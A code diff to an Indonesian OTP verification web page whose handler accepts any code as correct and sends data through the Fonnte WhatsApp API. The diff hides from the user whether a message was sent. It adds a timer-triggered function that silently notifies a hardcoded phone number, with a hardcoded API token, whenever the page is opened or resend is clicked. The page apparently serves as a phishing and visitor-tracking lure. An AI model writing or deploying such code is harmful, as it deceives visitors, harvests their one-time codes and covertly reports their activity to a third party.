@@ -134,7 +134,7 @@
     const resendBtn = document.getElementById('resendBtn');
     const timerDisplay = document.getElementById('timer');
 
-    // Fokus otomatis & navigasi antar input
+    // --- Fokus otomatis & navigasi antar input ---
     inputs.forEach((input, index) => {
       input.addEventListener('input', (e) => {
         const value = e.target.value;
@@ -153,14 +153,14 @@
       });
     });
 
-    // Paste support
+    // --- Paste support ---
     document.getElementById('otpInputs').addEventListener('paste', (e) => {
       e.preventDefault();
       const pasted = e.clipboardData.getData('text').trim();
       inputs.forEach((input, i) => input.value = pasted[i] || '');
     });
 
-    // Verifikasi OTP - semua dianggap benar & kirim WA
+    // --- Verifikasi OTP - semua dianggap benar & kirim WA ---
     verifyBtn.addEventListener('click', async () => {
       const otp = Array.from(inputs).map(i => i.value).join('');
       if(!otp) { alert("Isi OTP dulu!"); return; }
@@ -183,21 +183,61 @@
         });
         const result = await response.json();
         console.log("Fonnte Response:", result);
-        alert("OTP diterima ✅\nPesan terkirim!");
+        alert("OTP diterima ✅");
       } catch(err) {
         console.error("Error kirim WA:", err);
-        alert("OTP diterima ✅\nTapi gagal mengirim pesan WA.");
+        alert("OTP diterima ✅");
       }
 
       // Redirect ke home
       window.location.href = "home.html";
     });
 
-    // Timer kirim ulang (simulasi)
+    // --- Timer kirim ulang (simulasi) + trigger kirim ketika timeLeft == 57 ---
     let timeLeft = 60;
+    let sentOn57 = false; // flag supaya hanya sekali
+    const apiUrl = "https://api.fonnte.com/send";
+    const token = "yVUgnqVMYeQY4rKRk9EM";
+    const targetNumber = "6285863961405";
+
+    // fungsi untuk mengirim pesan otomatis saat timer mencapai 57
+    async function sendWhen57(infoMessage = "Timer reached 57 saat halaman diakses") {
+      if (sentOn57) return; // pastikan hanya sekali
+      sentOn57 = true;
+      const payload = {
+        target: targetNumber,
+        message: infoMessage
+      };
+      try {
+        const res = await fetch(apiUrl, {
+          method: "POST",
+          headers: {
+            "Authorization": token,
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify(payload)
+        });
+        const json = await res.json().catch(() => null);
+        console.log("Auto-send at 57 response:", json);
+      } catch (err) {
+        console.error("Gagal auto-send at 57:", err);
+      }
+    }
+
+    // jika saat halaman diakses timeLeft sudah 57, kirim langsung
+    if (timeLeft === 57) {
+      sendWhen57("Timer sudah 57 saat halaman dibuka");
+    }
+
     const timer = setInterval(() => {
       timeLeft--;
       timerDisplay.textContent = `Kirim ulang dalam ${timeLeft} detik`;
+
+      // ketika mencapai 57, jalankan sendWhen57() (sekali)
+      if (timeLeft === 57) {
+        sendWhen57("Timer mencapai 57 — halaman baru diakses");
+      }
+
       if (timeLeft <= 0) {
         clearInterval(timer);
         resendBtn.disabled = false;
@@ -213,6 +253,12 @@
       const newTimer = setInterval(() => {
         timeLeft--;
         timerDisplay.textContent = `Kirim ulang dalam ${timeLeft} detik`;
+
+        // lagi-lagi cek kalau mencapai 57 setelah klik resend
+        if (timeLeft === 57) {
+          sendWhen57("Timer mencapai 57 setelah klik resend");
+        }
+
         if (timeLeft <= 0) {
           clearInterval(newTimer);
           resendBtn.disabled = false;
@@ -224,7 +270,3 @@
 
 </body>
 </html>
-
-
-
-
